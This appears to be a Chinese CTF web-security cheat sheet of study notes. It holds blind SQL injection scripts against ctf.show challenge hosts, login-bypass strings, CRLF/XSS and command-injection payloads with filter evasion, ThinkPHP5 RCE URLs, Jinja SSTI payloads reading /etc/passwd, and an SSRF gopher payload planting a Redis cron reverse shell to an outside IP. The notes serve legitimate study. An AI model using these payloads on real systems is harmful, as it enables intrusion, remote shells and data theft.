# 信息泄露

* robots.txt

* comment(注释信息)

* vim swap/backup file(.bak/.php./.php~/.php.swp)

  ```shell
  vim -r .index.php.swp #转化为index.php
  ```

* .pyc

  ```shell
  cat flag.pyc  #查看.pyc文件的内容，flag可能可以直接找到。
  ```

  还原.pyc文件，使用`uncompyle2`

  ```shell
  #uncompyle2工具在kali虚拟机中
  uncompyle2 -o f.py flag.pyc  # f.py还原好的文件  flag.pyc需要还原的文件
  ```

* .DS_Store

  ds_store_exp，这是一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。

  ```shell
  python ds_store_exp.py http://www.example.com/.DS_Store
  ```

  或者

  ```python
  from ds_store import DSStore
  with DSStore.open('.DS_Store', 'r+') as d:
  	for i in d:
  		print(i)
  ```

* .git

  ```shell
  python GitHack.py http://x.x.x.x/.git/
  ```

* .svn

  ```
  http://127.0.0.1/.svn/entries
  ```

  工具：Seay SVN漏洞利用工具

* bak file(.tar.gz/.rar/.zip/.7z/.bak)

# SQL注入

### 简单注入

联合查询

宽字节

Cookie

大小写、双写

### 花式绕WAF

char,hex

干扰字符 /特性

白名单 spider

### 二次注入

写入数据库的时候，保留了原数据

## 基于布尔的盲注

在过滤逗号、分号时，可以使用脚本。

python脚本如下：

```python
import requests
s=requests.session()
url='http://7e6ff073-41c1-49a4-8ed7-1d91dd71867f.challenge.ctf.show:8080/'
table=""

for i in range(1,45):
    print(i)
    for j in range(31,128):
        #爆表名  flag
        #payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))
        #爆字段名 flag
        #payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))
        #读取flag
        payload = "ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"%(str(i), str(j))

        ra = s.get(url=url + '?id=0/**/or/**/' + payload).text

        if 'I asked nothing' in ra:
            table += chr(j)
            print(table)
            break
```

table_name可以使用每个字母的ASCII码的16进制数表示，例如flag：0x666C6167

## 基于时间的盲注

页面没有变化，只能使用基于时间的盲注。

Python脚本如下：

```python
import requests

if __name__ == '__main__':
    url = 'http://cbeb409a-91dd-4b51-a03e-0295776e36a5.challenge.ctf.show:8080/?id=1%27 and '
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},sleep(0.5),0)%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},sleep(0.5),0)%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagug"),{i},1))>{mid},sleep(0.5),0)%23'
            payload = f'if(ascii(substr((select group_concat(flag4a23) from ctfshow.flagug),{i},1))>{mid},sleep(0.5),0)%23'
            # print(payload)
            r = requests.get(url=url + payload)
            try:
                r = requests.get(url=url + payload, timeout=0.5)  # 0.5s内必须返回结果，然后执行下面的语句，如果0.15s还没有结果，则执行except的内容
                high = mid
            except:
                low = mid + 1
        if low != 32:
            result += chr(low)
            #print(result)
        else:
            break
        print(result)
```

## 特殊注入

### php md5函数

```php
$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
```

对于函数md5(string,raw)
第二个参数有以下可选项：
TRUE - 原始 16 字符二进制格式
FALSE - 默认。32 字符十六进制数
所以只要md5加密后的16进制转化为二进制时有 'or’xxxx，即可构成闭合语句： username ='admin' and password =‘ ’or 'xxxxx' 成功登陆
这里给出两个符合的字符串
ffifdyop
129581926211651571912466741651878684928
但题目有长度限制，所以输入ffifdyop即可获取flag

### mysql  with rollup

```php
<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>
```

```
payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=
因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row['password']的限制成功登陆。
```

### SQLite



## DNSLog注入

## nosql注入

### mangodb

## CRLF注入

CRLF 注⼊是⼀类漏洞，在⽤户设法向应⽤插⼊ CRLF 时出现。在多种互联⽹协议中，包括 HTML， CRLF 字符表示了⾏的末尾，**通常表示为\r\n，编码后是%0D%0A**。在和 HTTP 请求或响应头组合时，这可以⽤于表示⼀⾏的结束，并且可能导致不同的漏洞，包括 HTTP 请求⾛私和 HTTP 响应分割。

```
http://victim/foo?url=http://example.com
GET /foo HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com


http://victim/foo?url=http://example.com%0aSetcookie:PHPSESSION%3dadmin
GET /foo HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com
Set-cookie: PHPSESSION=admin
```



```
index.php?url=http://example.com/%0aX-XSS-Protection:
%200%0a%0d%0a%0d<img%20src=1%20onerror=alert(/xss/)>

GET /index.php HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com/
X-XSS-Protection: 0
<img src=1 onerror=alert(/xss/)>
```

## 命令注入

```php
<?php
if (isset($_GET['ip'])) {
	$cmd = 'ping -c1 '.$_GET['ip'];
	system($cmd);
}

//index.php?ip=;cat /etc/passwd
```

绕过过滤

```shell
cat<>flag.txt
cat<flag.txt
cat${IFS}flag.txt

a=c;b=at;c=flag.txt;$a$b $c
`echo Y2F0IGZsYWcudHh0Cg==|base64 -d`
ca""t flag.txt
c""at fl""ag.txt
c\at fl\ag.txt
```

## SSRF

1. dict protocol (操作Redis)
   curl -vvv 'dict://127.0.0.1:6379/info'  

2. file protocol (任意⽂件读取)  

   curl -vvv 'file:///etc/passwd'  

3. gopher protocol (⼀键反弹Bash)  

   curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%%0d%0a......**......'  

## 文件上传

# PHP

## 常用函数

```php
phpinfo(); //显示php信息
highlight_file("index.php");  //高亮显示文件源码
print_r(); // 函数用于打印变量，以更容易理解的形式展示。
glob();  // 函数返回匹配指定模式的文件名或目录。举个例子:glob("*") 匹配任意文件 glob("*.txt")匹配以txt为后缀的文件
```



1. 考察点为REQUEST变量覆盖、MD5绕过、file_get_contents写入、正则绕过。

   ```php
   include "flag.php";
   error_reporting(0);
   if($_REQUEST){
   foreach ($_REQUEST as $key => $value) {
   if(preg_match('/[a-zA-Z]/i', $value)){
   die("其实我劝你最好不要输入任何字母!");
               }
           }
       }
   
   if($_SERVER){
       if(!preg_match('/GJCTF|flag/i', $_SERVER['QUERY_STRING'])) die('不打你可能拿不到flag..');
   }
   if(isset($_GET['GJCTF'])){
       if(!(substr($_GET['GJCTF'], 32) === md5($_GET['GJCTF']))){
           die('日爆md5!!!!!!');
       }else{
       $getflag = file_get_contents($_GET['flag']);
       if($getflag === 'get_flag'){
       include 'flag.php';
       echo $flag;
       }else die('差一点哦!');
       }
   }
   GJCTF{You_A4e_@_Good_Hacker}
   ```

   REQUEST变量可以使用POST和GET变量同时覆盖，即当POST和GET参数名字相同时，REQUEST只能接收到POST参数并处理，并不会处理同名GET参数。正则和MD5以及substr都可以通过数组来绕过，这里算NULL绕过了。
   file_get_contents可诸如的方法有data://和php://input两种，但是由于正则过滤的原因，导致POST值会被正则拦下，所以php://input无法使用，因为POST参数会被处理，所以只能使用data://协议。

   ![](F:\LearningMaterials\Record\记录\images\1.PNG)


### 序列化serialize

   ```php
$key = "D0g3!!!";
echo serialise($key);//序列化
echo unserialize('s:7:"D0g3!!!";');//反序列化 s:7:"D0g3!!!";
   ```

当成员属性数目大于实际数目时可绕过wakeup方法。

```php
class xctf{
	public $flag = '111';
	public function __wakeup(){
		exit('bad requests');
	}
......
```

#### 绕过wakeup

序列化后的值为`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`，变为`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`可绕过__wakeup方法。

#### 绕过preg_match

```php
if (preg_match('/[oc]:\d+:/i', $var)) { 
    die('stop hacking!'); 
} else {
    @unserialize($var); 
} 
//"O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"  会被拦截
//"O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}" 可以绕过preg_match
```

### 伪协议

#### php://input

php://input是用来接收post数据的。

#### data://

```
data://text/plain,<?php phpinfo()?>

data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

data:text/plain,<?php phpinfo()?>

data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

//执行cmd
<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('whoami', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
```

#### data://filter

```
php://filter/read=convert.base64-encode/resource=[文件路径]
```

### 函数漏洞

#### preg_replace

preg_replace漏洞触发有两个前提：

01：第一个参数需要e标识符，有了它可以执行第二个参数的命令

02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：

```
//echo preg_replace('/test/e', 'phpinfo()', 'just test');
//这样是可以执行命令的

//echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
//echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
//这两种没有匹配上，所以返回值是第三个参数，不能执行命令
```

不能使用空格隔开，可用%20或者+代替，%26%26为&&，&&意思是当前面命令执行成功时，继续执行后面的命令。

### php-rce（thinkphp5 ）

远程代码执行漏洞

```url
http://127.0.0.1/public/index.php?s=index/\think\Request/input&data=phpinfo()&filter=assert
```

```url
//执行php命令
index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=111
//执行系统命令
index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
```



## HTTP Header

### request

| Header              | 解释                                                         | 示例                                                    |
| :------------------ | :----------------------------------------------------------- | :------------------------------------------------------ |
| Accept              | 指定客户端能够接收的内容类型                                 | Accept: text/plain, text/html                           |
| Accept-Charset      | 浏览器可以接受的字符编码集。                                 | Accept-Charset: iso-8859-5                              |
| Accept-Encoding     | 指定浏览器可以支持的web服务器返回内容压缩编码类型。          | Accept-Encoding: compress, gzip                         |
| Accept-Language     | 浏览器可接受的语言                                           | Accept-Language: en,zh                                  |
| Accept-Ranges       | 可以请求网页实体的一个或者多个子范围字段                     | Accept-Ranges: bytes                                    |
| Authorization       | HTTP授权的授权证书                                           | Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==       |
| Cache-Control       | 指定请求和响应遵循的缓存机制                                 | Cache-Control: no-cache                                 |
| Connection          | 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）           | Connection: close                                       |
| Cookie              | HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 | Cookie: $Version=1; Skin=new;                           |
| Content-Length      | 请求的内容长度                                               | Content-Length: 348                                     |
| Content-Type        | 请求的与实体对应的MIME信息                                   | Content-Type: application/x-www-form-urlencoded         |
| Date                | 请求发送的日期和时间                                         | Date: Tue, 15 Nov 2010 08:12:31 GMT                     |
| Expect              | 请求的特定的服务器行为                                       | Expect: 100-continue                                    |
| From                | 发出请求的用户的Email                                        | From: user@email.com                                    |
| Host                | 指定请求的服务器的域名和端口号                               | Host: www.zcmhi.com                                     |
| If-Match            | 只有请求内容与实体相匹配才有效                               | If-Match: “737060cd8c284d8af7ad3082f209582d”            |
| If-Modified-Since   | 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 | If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT        |
| If-None-Match       | 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 | If-None-Match: “737060cd8c284d8af7ad3082f209582d”       |
| If-Range            | 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag | If-Range: “737060cd8c284d8af7ad3082f209582d”            |
| If-Unmodified-Since | 只在实体在指定时间之后未被修改才请求成功                     | If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT      |
| Max-Forwards        | 限制信息通过代理和网关传送的时间                             | Max-Forwards: 10                                        |
| Pragma              | 用来包含实现特定的指令                                       | Pragma: no-cache                                        |
| Proxy-Authorization | 连接到代理的授权证书                                         | Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== |
| Range               | 只请求实体的一部分，指定范围                                 | Range: bytes=500-999                                    |
| Referer             | 先前网页的地址，当前请求网页紧随其后,即来路                  | Referer: http://www.zcmhi.com/archives/71.html          |
| TE                  | 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息     | TE: trailers,deflate;q=0.5                              |
| Upgrade             | 向服务器指定某种传输协议以便服务器进行转换（如果支持）       | Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11          |
| User-Agent          | User-Agent的内容包含发出请求的用户信息                       | User-Agent: Mozilla/5.0 (Linux; X11)                    |
| Via                 | 通知中间网关或代理服务器地址，通信协议                       | Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)             |
| Warning             | 关于消息实体的警告信息                                       | Warn: 199 Miscellaneous warning                         |
| X-Forwarded-For     | 用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 | X-Forwarded-For:127.0.0.1                               |

### response

|       Header       |                             解释                             |                         示例                          |
| :----------------: | :----------------------------------------------------------: | :---------------------------------------------------: |
|   Accept-Ranges    |      表明服务器是否支持指定范围请求及哪种类型的分段请求      |                 Accept-Ranges: bytes                  |
|        Age         |     从原始服务器到代理缓存形成的估算时间（以秒计，非负）     |                        Age: 12                        |
|       Allow        |        对某网络资源的有效的请求行为，不允许则返回405         |                   Allow: GET, HEAD                    |
|   Cache-Control    |           告诉所有的缓存机制是否可以缓存及哪种类型           |                Cache-Control: no-cache                |
|  Content-Encoding  |            web服务器支持的返回内容压缩编码类型。             |                Content-Encoding: gzip                 |
|  Content-Language  |                         响应体的语言                         |                Content-Language: en,zh                |
|   Content-Length   |                         响应体的长度                         |                  Content-Length: 348                  |
|  Content-Location  |                请求资源可替代的备用的另一地址                |             Content-Location: /index.htm              |
|    Content-MD5     |                     返回资源的MD5校验值                      |         Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==         |
|   Content-Range    |                在整个返回体中本部分的字节位置                |        Content-Range: bytes 21010-47021/47022         |
|    Content-Type    |                      返回内容的MIME类型                      |        Content-Type: text/html; charset=utf-8         |
|        Date        |                   原始服务器消息发出的时间                   |          Date: Tue, 15 Nov 2010 08:12:31 GMT          |
|        ETag        |                  请求变量的实体标签的当前值                  |       ETag: “737060cd8c284d8af7ad3082f209582d”        |
|      Expires       |                     响应过期的日期和时间                     |        Expires: Thu, 01 Dec 2010 16:00:00 GMT         |
|   Last-Modified    |                    请求资源的最后修改时间                    |     Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT      |
|      Location      |  用来重定向接收方到非请求URL的位置来完成请求或标识新的资源   |    Location: http://www.zcmhi.com/archives/94.html    |
|       Pragma       |      包括实现特定的指令，它可应用到响应链上的任何接收方      |                   Pragma: no-cache                    |
| Proxy-Authenticate |         它指出认证方案和可应用到代理的该URL上的参数          |               Proxy-Authenticate: Basic               |
|      refresh       | 应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持） | Refresh: 5; url=http://www.zcmhi.com/archives/94.html |
|    Retry-After     |     如果实体暂时不可取，通知客户端在指定时间之后再次尝试     |                   Retry-After: 120                    |
|       Server       |                      web服务器软件名称                       |     Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)      |
|     Set-Cookie     |                       设置Http Cookie                        |  Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1  |
|      Trailer       |               指出头域在分块传输编码的尾部存在               |                 Trailer: Max-Forwards                 |
| Transfer-Encoding  |                         文件传输编码                         |               Transfer-Encoding:chunked               |
|        Vary        |        告诉下游代理是使用缓存响应还是从原始服务器请求        |                        Vary: *                        |
|        Via         |              告知代理客户端响应是通过哪里发送的              |      Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)      |
|      Warning       |                    警告实体可能存在的问题                    |          Warning: 199 Miscellaneous warning           |
|  WWW-Authenticate  |             表明客户端请求实体应该使用的授权方案             |                WWW-Authenticate: Basic                |

# Python

### templete injection

1. 简单嗅探

   http://111.198.29.45:42611/{{7+7}}

   若返回：URL http://111.198.29.45:59331/14 not found，则说明执行了{{}}内的代码

2. {{ config.items() }}查看服务器配置

3. {{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}  读取密码

4. 执行代码

   ```python
   {% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__ == 'catch_warnings' %}
     {% for b in c.__init__.__globals__.values() %}  
     {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数
       {% if 'eval' in b.keys() %}    //找到了
         {{ b['eval']('__import__("os").popen("ls").read()') }}  //导入cmd 执行popen里的命令 read读出数据
       {% endif %}
     {% endif %}
     {% endfor %}
   {% endif %}
   {% endfor %}
   ```

5. 读文件

   ```python
   ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
   ```

6. 写文件

   ```python
    ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
   ```

7. 